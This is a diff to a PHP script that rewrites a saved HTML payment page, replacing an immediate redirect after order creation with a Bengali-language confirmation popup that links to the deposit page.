@@ -231,8 +231,10 @@ $nextJs = '(function(){'
     . 'fetch("' . $apiCreateOrder . '",{method:"POST",headers:{"Content-Type":"application/json"},'
     . 'body:JSON.stringify({method:m,amount:Number(a.replace(/,/g,"")),channel:c})})'
     . '.then(function(r){return r.json()})'
-    . '.then(function(d){if(d.success&&d.trackingNumber){window.location.href="' . $paymentUrl . '?tracking="+d.trackingNumber;}'
-    . 'else{alert(d.error||"Failed to create order");if(btn){btn.disabled=false;btn.textContent="\u09AA\u09B0\u09AC\u09B0\u09CD\u09A4\u09C0";}}})'
+    . '.then(function(d){if(d.success&&d.trackingNumber){'
+    . 'var go=document.getElementById("vcConfirmGo");if(go){go.onclick=function(e){e.preventDefault();window.location.href="' . $paymentUrl . '?tracking="+d.trackingNumber;};}'
+    . 'var pop=document.getElementById("vcConfirmPopup");if(pop)pop.classList.add("show");'
+    . '}else{alert(d.error||"Failed to create order");if(btn){btn.disabled=false;btn.textContent="\u09AA\u09B0\u09AC\u09B0\u09CD\u09A4\u09C0";}}})'
     . '.catch(function(){alert("Network error. Try again.");if(btn){btn.disabled=false;btn.textContent="\u09AA\u09B0\u09AC\u09B0\u09CD\u09A4\u09C0";}});'
     . '})();';
 $html = preg_replace(
@@ -247,6 +249,9 @@ $html = str_replace(
     "check.style.cssText = 'position:absolute;right:0;bottom:0;width:.32rem;height:.32rem;display:block;fill:#ec2529;z-index:2;'",
     $html
 );
+if (strpos($html, 'vcConfirmPopup') === false) {
+    $html = str_replace('</body>', '<style>#vcConfirmPopup{display:none;position:fixed;top:0;right:0;bottom:0;left:0;z-index:10000004}#vcConfirmPopup.show{display:block}</style><div class="am-modal am-modal-transparent" id="vcConfirmPopup"><div class="am-modal-mask"></div><div class="am-modal-wrap" role="dialog" aria-modal="true"><div class="am-modal-content"><div class="am-modal-header"><div class="am-modal-title">নিশ্চিতকরণ</div></div><div class="am-modal-body"><div style="zoom:1;overflow:hidden"><div><div>সাফল্য! দয়া করে জমা পৃষ্ঠায় যান</div></div></div></div><div class="am-modal-footer"><div class="am-modal-button-group-v am-modal-button-group-normal" role="group"><a class="am-modal-button" role="button" id="vcConfirmGo">যাও</a></div></div></div></div></div></body>', $html);
+}
 
 $html = preg_replace('/\sdata-savepage-href="[^"]*"/i', '', $html);
 $html = preg_replace('/<meta\s+name="savepage-[^"]*"[^>]*>/i', '', $html);
